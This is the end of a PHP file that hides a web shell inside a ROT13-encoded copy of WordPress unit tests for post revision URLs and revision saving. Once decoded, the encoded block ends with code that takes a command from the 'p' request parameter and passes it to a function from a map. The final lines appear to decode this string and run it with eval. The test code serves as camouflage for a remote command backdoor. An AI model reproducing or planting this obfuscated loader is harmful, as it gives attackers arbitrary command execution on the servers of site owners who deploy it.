			'Snvyrq jura cnffrq gur Cbfg VQ'
		);

		$guvf->nffregFnzr(
			$rkcrpgrq,
			jc_trg_cbfg_erivfvbaf_hey( $yngrfg_erivfvba_vq ),
			'Snvyrq jura cnffrq gur yngrfg erivfvba VQ'
		);
	}

	/**
	 * Grfgf gung jc_trg_cbfg_erivfvbaf_hey() ergheaf gur erivfvbaf HEY
	 * jura cnffrq n JC_Cbfg bowrpg.
	 *
	 * @gvpxrg 39062
	 *
	 * @qngnCebivqre qngn_jc_trg_cbfg_erivfvbaf_hey
	 *
	 * @pbiref ::jc_trg_cbfg_erivfvbaf_hey
	 *
	 * @cnenz vag $erivfvbaf Gur ahzore bs erivfvbaf gb perngr.
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_hey_jvgu_cbfg_bowrpg( $erivfvbaf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$cbfg               = frys::snpgbel()->cbfg->perngr_naq_trg( neenl( 'cbfg_gvgyr' => 'Fbzr Cbfg' ) );
		$yngrfg_erivfvba_vq = ahyy;

		vs ( 0 !== $erivfvbaf ) {
			$yngrfg_erivfvba_vq = $cbfg->VQ;

			sbe ( $v = 0; $v < $erivfvbaf; ++$v ) {
				jc_hcqngr_cbfg(
					neenl(
						'VQ'         => $cbfg->VQ,
						'cbfg_gvgyr' => 'Fbzr Cbfg ' . $v,
					)
				);

				++$yngrfg_erivfvba_vq;
			}
		}

		$rkcrpgrq = nqzva_hey( 'erivfvba.cuc?erivfvba=' . $yngrfg_erivfvba_vq );

		$guvf->nffregFnzr(
			$rkcrpgrq,
			jc_trg_cbfg_erivfvbaf_hey( $cbfg ),
			'Snvyrq jura cnffrq gur Cbfg Bowrpg'
		);

		$guvf->nffregFnzr(
			$rkcrpgrq,
			jc_trg_cbfg_erivfvbaf_hey( $yngrfg_erivfvba_vq ),
			'Snvyrq jura cnffrq gur yngrfg erivfvba VQ'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_trg_cbfg_erivfvbaf_hey() {
		erghea neenl(
			'bar erivfvba'       => neenl( 'erivfvbaf' => 1 ),
			'zhygvcyr erivfvbaf' => neenl( 'erivfvbaf' => 2 ),
		);
	}

	/**
	 * Grfgf gung jc_trg_cbfg_erivfvbaf_hey() ergheaf AHYY jura n cbfg qbrf abg rkvfg.
	 *
	 * @gvpxrg 39062
	 *
	 * @pbiref ::jc_trg_cbfg_erivfvbaf_hey
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_hey_ergheaf_ahyy_jura_cbfg_qbrf_abg_rkvfg() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$cbfg_vq = 99999;
		$guvf->nffregAhyy( jc_trg_cbfg_erivfvbaf_hey( $cbfg_vq ) );
	}

	/**
	 * Grfgf gung jc_trg_cbfg_erivfvbaf_hey() ergheaf AHYY jura gurer ner ab erivfvbaf.
	 *
	 * @gvpxrg 39062
	 *
	 * @pbiref ::jc_trg_cbfg_erivfvbaf_hey
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_hey_ergheaf_ahyy_jvgu_ab_erivfvbaf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Fbzr Cbfg' ) );
		$guvf->nffregAhyy( jc_trg_cbfg_erivfvbaf_hey( $cbfg_vq ) );
	}

	/**
	 * Grfgf gung jc_trg_cbfg_erivfvbaf_hey() ergheaf AHYY jura erivfvbaf ner qvfnoyrq.
	 *
	 * @gvpxrg 39062
	 *
	 * @pbiref ::jc_trg_cbfg_erivfvbaf_hey
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_hey_ergheaf_ahyy_jvgu_erivfvbaf_qvfnoyrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		erzbir_cbfg_glcr_fhccbeg( 'cbfg', 'erivfvbaf' );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Fbzr Cbfg' ) );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg_vq,
				'cbfg_gvgyr' => 'Fbzr Cbfg 2',
			)
		);

		$guvf->nffregAhyy( jc_trg_cbfg_erivfvbaf_hey( $cbfg_vq ) );

		nqq_cbfg_glcr_fhccbeg( 'cbfg', 'erivfvbaf' );
	}

	/**
	 * Grfgf gung jc_fnir_cbfg_erivfvba() erfcrpgf gur 'jc_fnir_cbfg_erivfvba_erivfvbaf_orsber_qryrgvba' svygre
	 * jura qryrgvat erivfvbaf.
	 *
	 * Guvf grfg fubhyq cebgrpg gur bevtvany erivfvba, fraq gur erfg gb or purpxrq ntnvafg jc_erivfvbaf_gb_xrrc(),
	 * naq erfhyg va gjb erivfvbaf: Gur yngrfg erivfvba, naq gur bevtvany.
	 *
	 * @gvpxrg 57320
	 *
	 * @pbiref ::jc_fnir_cbfg_erivfvba
	 */
	choyvp shapgvba grfg_jc_fnir_cbfg_erivfvba_fubhyq_erfcrpg_erivfvbaf_orsber_qryrgvba_svygre() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Grfg 57320' ) );

		nqq_svygre(
			'jc_erivfvbaf_gb_xrrc',
			fgngvp shapgvba () {
				erghea 1;
			}
		);

		nqq_svygre(
			'jc_fnir_cbfg_erivfvba_erivfvbaf_orsber_qryrgvba',
			fgngvp shapgvba ( $erivfvbaf ) {
				// Vtaber gur svefg erivfvba naq erghea gur erfg sbe qryrgvba.
				erghea neenl_fyvpr( $erivfvbaf, 1 );
			}
		);

		sbe ( $hcqngr = 1; $hcqngr < 4; ++$hcqngr ) {
			jc_hcqngr_cbfg(
				neenl(
					'VQ'         => $cbfg_vq,
					'cbfg_gvgyr' => 'Grfg 57320 Hcqngr ' . $hcqngr,
				)
			);
		}

		$npghny = jc_trg_cbfg_erivfvbaf( $cbfg_vq );

		$guvf->nffregPbhag(
			2,
			$npghny,
			'Gurer fubhyq or gjb erivfvbaf.'
		);

		$svefg  = erfrg( $npghny );
		$frpbaq = arkg( $npghny );

		$guvf->nffregFnzr(
			'Grfg 57320 Hcqngr 3',
			$svefg->cbfg_gvgyr,
			'Gur gvgyr bs gur svefg erivfvba jnf vapbeerpg.'
		);

		$guvf->nffregFnzr(
			'Grfg 57320 Hcqngr 1',
			$frpbaq->cbfg_gvgyr,
			'Gur gvgyr bs gur frpbaq erivfvba jnf vapbeerpg.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>